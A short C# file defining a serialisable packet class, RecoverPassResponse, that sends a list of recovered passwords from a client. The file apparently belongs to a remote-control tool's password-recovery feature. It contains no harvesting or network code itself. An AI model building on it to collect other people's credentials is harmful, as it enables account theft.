using ProtoBuf;
using System;
using System.Collections.Generic;
using xServer.Core.Recovery.Helper;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class RecoverPassResponse : IPacket
    {
        [ProtoMember(1)]
        public List<string> Passwords { get; set; }

        public RecoverPassResponse()
        {
        }

        public RecoverPassResponse(List<string> data)
        {
            this.Passwords = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}